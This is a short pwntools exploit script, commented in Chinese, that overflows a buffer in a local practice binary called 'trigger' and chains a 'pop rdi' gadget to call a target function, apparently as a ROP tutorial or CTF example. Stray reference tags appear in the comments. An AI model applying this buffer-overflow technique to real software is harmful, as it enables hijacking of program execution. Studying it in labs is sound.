from pwn import *

# 1. 设置目标架构
context.arch = 'amd64'

# 2. 加载目标二进制文件，pwntools会自动分析并提取gadget
elf = context.binary = ELF('./trigger')

# 3. 初始化ROP对象，它会自动扫描二进制文件中的所有可用gadget[reference:3]
rop = ROP(elf)

# 4. 手动构建ROP链
# 首先，覆盖缓冲区到返回地址的偏移
payload = b'A' * 72          # padding
payload += p64(rop.rdi.address) # pop rdi; ret 的地址[reference:4]
payload += p64(0xdeadbeef)   # 给rdi赋的值，即第一个参数
payload += p64(elf.sym['target_function']) # 调用目标函数

# 发送payload
p = process('./trigger')
p.send(payload)
p.interactive()